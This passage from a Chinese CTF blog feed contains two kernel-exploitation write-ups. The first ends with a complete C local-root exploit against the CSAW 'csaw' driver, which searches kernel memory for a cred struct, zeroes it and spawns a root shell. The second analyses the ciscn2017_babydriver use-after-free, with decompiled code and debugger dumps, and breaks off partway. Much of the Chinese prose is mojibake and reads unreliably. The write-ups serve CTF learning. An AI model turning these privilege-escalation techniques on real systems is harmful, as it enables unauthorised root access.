class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">å®Œæ•´exp:</span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define CSAW_IOCTL_BASE     0x77617363</span><br><span class="line">#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span><br><span class="line">#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span><br><span class="line">#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span><br><span class="line">#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span><br><span class="line">#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span><br><span class="line">#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span><br><span class="line">#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span><br><span class="line">#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span><br><span class="line"></span><br><span class="line">struct alloc_channel_args &#123;</span><br><span class="line">    size_t buf_size;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct open_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct shrink_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct read_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct write_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct seek_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    loff_t index;</span><br><span class="line">    int whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct close_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    struct alloc_channel_args alloc_channel;</span><br><span class="line">    struct shrink_channel_args shrink_channel;</span><br><span class="line">    struct seek_channel_args seek_channel;</span><br><span class="line">    struct read_channel_args read_channel;</span><br><span class="line">    struct write_channel_args write_channel;</span><br><span class="line">    struct close_channel_args close_channel;</span><br><span class="line"></span><br><span class="line">    int fd = -1;</span><br><span class="line">    u_int64_t addr = 0xffff880000000000;</span><br><span class="line">    u_int64_t real_cred = 0;</span><br><span class="line">    u_int64_t cred = 0;</span><br><span class="line">    u_int64_t target_addr;</span><br><span class="line">    u_int64_t result = 0;</span><br><span class="line">    int root_cred[12];</span><br><span class="line"></span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    char *buf = malloc(0x1000);</span><br><span class="line">    char target[16];</span><br><span class="line">    strcpy(target,&quot;an9999999999ela&quot;);</span><br><span class="line">    prctl(PR_SET_NAME,target);</span><br><span class="line">    fd = open(&quot;/dev/csaw&quot;,O_RDWR);</span><br><span class="line">    if(fd&lt;0)&#123;</span><br><span class="line">        perror(&quot;open error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    alloc_channel.buf_size = 0x100;</span><br><span class="line">    alloc_channel.id = -1;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    if(alloc_channel.id == -1)&#123;</span><br><span class="line">        perror(&quot;alloc error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] you have got a channel %d\n&quot;,alloc_channel.id);</span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = 0x101;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);   //channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff</span><br><span class="line">    printf(&quot;[+] now we can read and write any mem\n&quot;);</span><br><span class="line">    for(;addr &lt; 0xffffc80000000000;addr += 0x1000)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr-0x10;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = 0x1000;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">        result = memmem(buf,0x1000,target,16);</span><br><span class="line">        if (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(size_t *)(result - 0x8);</span><br><span class="line">real_cred = *(size_t *)(result - 0x10);</span><br><span class="line">if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span><br><span class="line">target_addr = addr + result-(int)(buf);</span><br><span class="line">printf(&quot;[+]found task_struct 0x%lx\n&quot;,target_addr);</span><br><span class="line">printf(&quot;[+]found cred 0x%lx\n&quot;,real_cred);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(result == 0)&#123;</span><br><span class="line">puts(&quot;not found , try again &quot;);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(getuid() == 0)&#123;</span><br><span class="line">        printf(&quot;[+] root now \n&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§çš„è§£æ³•è¿˜ç®—å¸¸è§„ï¼Œç¬¬äºŒä¸‰ç§è§£æ³•å°±å¾ˆéªšäº†ï¼Œçœ‹ç€p4ndaå’Œraycpä¸¤ä½å¤§å¸ˆå‚…çš„åšå®¢å­¦çš„ï¼Œå¸ˆå‚…ä»¬tql!ğŸ¤©,å¦å¤–ä¸¤ç§ä¼šå•ç‹¬å†å†™ä¸¤ç¯‡postã€‚å‘¨ä¸€è¿˜æœ‰è€ƒè¯•ï¼Œèµ¶ç´§å»å¤ä¹ äº†ğŸ˜­ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn UAF</title>
      <link href="/2020/11/09/kernel_pwn(3)/"/>
      <url>/2020/11/09/kernel_pwn(3)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-UAF"><a href="#kernel-pwn-UAF" class="headerlink" title="kernel_pwn UAF"></a>kernel_pwn UAF</h3><blockquote><p>å†…æ ¸çš„UAFå’Œç”¨æˆ·æ€çš„å·®ä¸å¤šï¼Œä¸åŒçš„æ˜¯å†…æ ¸ä½¿ç”¨çš„æ˜¯slab&#x2F;slubåˆ†é…å™¨æ¥ç®¡ç†å †å—ã€‚<br>é¢˜ç›®æ¥æºï¼šciscn2017_babydriver</p></blockquote><span id="more"></span><p>æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†smepä¿æŠ¤ï¼ˆå†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ï¼‰ã€‚<br>æŸ¥çœ‹initï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /prock</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°åŠ è½½äº†babydriver.koæ¨¡å—ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æ¼æ´çš„lkmäº†ï¼Œidaæ‰“å¼€å¼€å§‹å¹²æ´»ï¼š<br>å…³é”®å‡½æ•°babyopen():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°å…¨å±€çš„ç»“æ„ä½“babydev_structæœ‰ä¸¤ä¸ªæˆå‘˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure><p>æ¯å½“æ‰“å¼€ä¸€ä¸ªè®¾å¤‡æ—¶ï¼Œéƒ½ä¼šé€šè¿‡kmallocç”³è¯·å¤§å°ä¸º0x40çš„å†…å­˜å…¶ptrèµ‹ç»™device_buf,0x40ç»™åˆ°device_buf_lenã€‚ç”±äºå®ƒæ˜¯å®šä¹‰åœ¨å…¨å±€çš„ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ¯æ¬¡openéƒ½ä¼šæ›´æ–°è¯¥structçš„å†…å®¹ã€‚<br>æ¥ä¸‹æ¥baby_ioctl():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆkfreeæ‰structé‡Œdevice_bufæŒ‡å‘çš„å†…å­˜ï¼Œä¹‹åkamllocå¤§å°å¯æ§çš„å†…å­˜å¹¶æ›´æ–°ç»“æ„ä½“ã€‚<br>baby_write():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç»“æ„ä½“é‡Œçš„device_bufå†™å…¥å†…å®¹ã€‚</p><p>baby_release():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kfreeæ‰device_bufï¼Œä½†æ²¡ç½®0ã€‚</p><p>åˆ†æå®Œæˆ‘ä»¬å¯ä»¥å‘ç°é—®é¢˜å°±åœ¨äºæˆ‘ä»¬æ— è®ºæ˜¯ä»€ä¹ˆæ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªbabydev_structç»“æ„ä½“ï¼Œä½†è¿™ä¸ªç»“æ„ä½“æ˜¯å…¨å±€çš„ï¼Œå¦‚æœæˆ‘ä»¬openä¸¤æ¬¡çš„è¯ç¬¬ä¸€æ¬¡kmallocçš„ptrå°±ä¼šè¢«ç¬¬äºŒæ¬¡kmallocçš„ptrè¦†ç›–ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— è®ºæ˜¯å¯¹fd1è¿›è¡Œæ“ä½œè¿˜æ˜¯å¯¹fd2è¿›è¡Œæ“ä½œå°†ä¼šæ˜¯åŒä¸€å—å†…å­˜ï¼Œå¦‚æœclose(fd1)è€Œå¯¹fd2è¿›è¡Œæ“ä½œå°±å¯å®ç°UAFçš„æ•ˆæœã€‚</p><p>é‚£è¯¥å¦‚ä½•ææƒå‘¢ï¼Ÿå®¹æ˜“æƒ³åˆ°åŠ«æŒcredç»“æ„ä½“æ”¹å†™uidgidï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹ï¼š<br>1.openä¸¤æ¬¡å¾—åˆ°fd1.fd2<br>2.åˆ©ç”¨ioctlæ”¹structä¿å­˜0xc8å¤§å°çš„å †å—(credç»“æ„ä½“å¤§å°ä¸º0xa8)<br>3.close(fd1)æ­¤æ—¶0xa8å¤§å°çš„å†…å­˜è¢«kfree()<br>4.forkå‡ºå­è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹åˆ›å»ºæ—¶ä¼šç”³è¯·å­˜æ”¾credç»“æ„ä½“çš„å†…å­˜ï¼Œæ­¤æ—¶åˆšè¢«kfreeçš„å †å—è¢«ç”³è¯·å‡ºæ¥ã€‚<br>5.é€šè¿‡å¯¹fd2è¿›è¡Œwriteæ“ä½œæ”¹å†™credç»“æ„ä½“çš„uidgid&#x3D;0å®Œæˆææƒã€‚</p><p>è°ƒè¯•ï¼š<br>æ‰§è¡Œå®Œç¬¬äºŒæ­¥çš„ç»“æ„ä½“:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/20gx 0xffffffffc00024c9-1</span><br><span class="line">0xffffffffc00024c8:0x00000000000000000xffff880003ce16c0</span><br><span class="line">0xffffffffc00024d8:0x00000000000000a80x0000000000000000</span><br><span class="line">0xffffffffc00024e8:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>writeå‰(å·²ç»åŠ«æŒcred):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/20gx 0xffff880003ce16c0-0x10</span><br><span class="line">0xffff880003ce16b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16c0:0x000003e8000000020x000003e8000003e8</span><br><span class="line">0xffff880003ce16d0:0x000003e8000003e80x000003e8000003e8</span><br><span class="line">0xffff880003ce16e0:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff880003ce16f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce1700:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff880003ce1710:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>writeå:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/20gx 0xffff880003ce16c0-0x10</span><br><span class="line">0xffff880003ce16b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16c0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16d0:0x00000000000000000x000003e800000000</span><br><span class="line">0xffff880003ce16e0:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff880003ce16f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce1700:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff880003ce1710:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>å¯¹ç…§å†…æ ¸credç»“æ„ä½“æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> 